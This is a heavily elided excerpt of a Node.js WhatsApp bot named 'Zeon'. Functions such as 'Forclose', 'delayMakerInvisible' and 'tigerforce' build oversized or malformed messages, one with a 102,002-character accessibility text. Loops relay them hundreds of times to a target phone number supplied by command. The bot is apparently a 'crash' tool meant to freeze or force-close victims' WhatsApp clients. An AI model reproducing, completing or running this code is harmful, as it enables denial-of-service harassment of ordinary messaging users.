...
module.exports = Zeon = async (Zeon, m, chatUpdate, store) => {
try {
...
? Zeon.user.id.split(":")[0] || Zeon.user.id
...
const botNumber = await Zeon.decodeJid(Zeon.user.id);
...
// function Group
const groupMetadata = isGroup ? await Zeon.groupMetadata(m.chat).catch((e) => {}) : "";
...
async function Forclose(target) {
  try {
    ...
    await Zeon.relayMessage(target, message, {
      messageId: null,
...
async function delayMakerInvisible(target) {
        ...
        viewOnceMessage: {
            message: {
                ...
                forwardedNewsletterMessageInfo: {
                    ...
                    serverMessageId: 1,
                    newsletterName: `Zeon 𖣂      - 〽${"ꥈ𝗙𝗮𝗿𝗲𝗹 𝗦𝗶𝗹𝗲𝗻𝗰𝗲 🜲ꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `Zeon 𝗜********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
    ...
    await Zeon.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}

async function carousel(Zeon, target) {
 let haxxn = 60;
...
await Zeon.relayMessage(target, carousel.message, {
...
async function GxhorseForceClose(tqw) {
  ...
  for (let r = 0; r < 666; r++) {
            ...
            interactiveMessage: {
              ...
              nativeFlowMessage: {
                ...
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: apiClient + "Zeon",
                  },
                  {
    ...
    await Zeon.relayMessage(tqw, msg.message, {
      participant: { jid: tqw },
      messageId: msg.key.id
    });

    await sleep(5000);
    console.log("The Zeon");
  }
}

async function tigerforce(target, Zeon) {
  ...
  for (let i = 0; i < 333; i++) {
    try {
      ...
      await Zeon.relayMessage(target, msg.message, {
        messageId: msg.key.id
      });

      console.log(`Zeon v1 [${i + 1}/333] to ${target}`);
      await sleep(3000);
...
async function loading() {
    ...
    let { key } = await Zeon.sendMessage(m.chat, { text: 'ʟᴏᴀᴅɪɴɢ...' });
    for (let i = 0; i < loadd.length; i++) {
      await sleep(500);
      await Zeon.sendMessage(m.chat, { text: loadd[i], edit: key });
  }
} 
...
const fs = require('fs');
try {
const data = fs.readFileSync('Zeon.js', 'utf8');
...
Zeon.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: m})
}}
...
let buttons = [
    ...
    let buttonMessage = {
        ...
        contextInfo: {
            ...
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363414490498679@newsletter",
                newsletterName: `Zeon`
            }
        },
        footer: "© Thx for using Zeon",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
    ...
    await Zeon.sendMessage(m.chat, buttonMessage, { quoted: loli });
}; break
...
if (!text) { 
return await Zeon.sendMessage(m.chat, { text: `*Example:*\n${prefix + command} 62xx / @tag` });
    }
...
carousel(Zeon, target)
carousel(Zeon, target)
Zeon.sendMessage(from, {react: {text: "☠️", key: m.key}})
} break
...
let ceknya = await Zeon.onWhatsApp(prrkek)
